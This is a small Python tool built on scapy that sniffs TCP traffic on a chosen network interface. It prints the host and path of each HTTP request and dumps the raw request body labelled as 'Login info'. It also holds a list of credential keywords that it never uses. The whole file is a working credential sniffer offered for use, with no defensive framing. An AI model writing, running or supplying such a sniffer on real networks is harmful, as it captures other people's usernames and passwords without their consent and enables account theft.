from scapy.all import sniff, Raw
from scapy_http import http
from argparse import ArgumentParser


class Sniffer():
    pass_keywords = ['username', 'user', 'login', 'password', 'pass']

    def _get_url_from_packet(self, packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


    def _get_login_info_from_http(self, packet, verbose=True):
        if packet.haslayer(Raw):
            load = packet[Raw].load
            return load

    def process_sniffed_packet(self, packet):
        if packet.haslayer(http.HTTPRequest):
            url = self._get_url_from_packet(packet)
            print('[+] HTTP REQUEST AT: ' + url)
            login_info = self._get_login_info_from_http(packet)
            if login_info:
                print('[+] Login info :' + login_info)


    def sniffer(self, interface):
        sniff(iface=interface, store=False, prn=self.process_sniffed_packet, filter='tcp')


def get_interface():
    parser = ArgumentParser()
    parser.add_argument('-i', '--interface', dest="interface")
    options = parser.parse_args()
    if not options.interface:
        parser.error('[-] Please specify your interface')
    return options.interface


if __name__ == '__main__':
    # Sniff with basic data
    Sniffer().sniffer(get_interface())
